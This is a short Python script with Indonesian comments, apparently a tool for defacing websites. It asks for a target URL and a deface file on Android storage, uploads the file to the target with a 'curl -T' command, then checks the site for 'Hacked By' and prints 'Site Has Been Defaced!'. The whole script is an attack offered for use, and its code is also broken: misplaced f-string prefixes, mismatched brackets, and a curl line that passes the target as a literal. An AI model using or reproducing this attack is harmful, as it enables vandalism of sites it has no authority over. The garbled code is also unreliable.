import os

import time

import requests

target = input(f"URL Target: ")

file = input(f"Nama Scriptdeface Kamu: ")

file_directory = "f+/storage/emulated/0/{file)"

#Simpan file defacenya di internal ya

#internal: /storage/emulated/0

print("Wait..")

time.sleep(1.3)

os.system("f+curl -T {file_directory) (target)}")

response = requests.get(target)

if "Hacked By" in response.text: print("Site Has Been Defaced!")